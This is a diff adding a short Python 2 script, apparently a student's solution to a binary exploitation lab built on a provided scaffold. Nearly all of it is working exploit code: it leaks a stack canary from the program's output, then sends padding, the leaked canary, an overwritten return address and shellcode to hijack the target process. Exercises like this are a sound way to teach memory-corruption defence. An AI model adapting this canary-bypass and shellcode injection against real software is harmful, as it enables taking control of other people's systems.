@@ -1,0 +1,34 @@
+#!/usr/bin/env python2
+
+import scaffold as p
+from scaffold import SHELLCODE
+
+### YOUR CODE STARTS HERE ###
+
+# Program start:
+#p.start()
+
+# Example send:
+#p.send('test\\x41\n')
+
+# Example receive:
+#assert p.recv(6) == 'testA\n'
+
+p.start()
+initial = 'A' * 12 + '\\x' + '\n'
+p.send(initial)
+
+output = p.recvline()
+canary = output[13:17]
+binary_canary = ' '.join("{:02x}".format(ord(x)) for x in canary)
+print "output:", output
+print "canary:", canary
+print "binary_canary:", binary_canary + "canaryend"
+print "size:", len(canary)
+print "Second send now:\n"
+padding = "A" * 15 + '\x00'
+eip = "\x00\xd8\xff\xff"
+
+p.send(padding + canary + "A" * 12 + eip + SHELLCODE + "\n")
+
+### YOUR CODE ENDS HERE ###
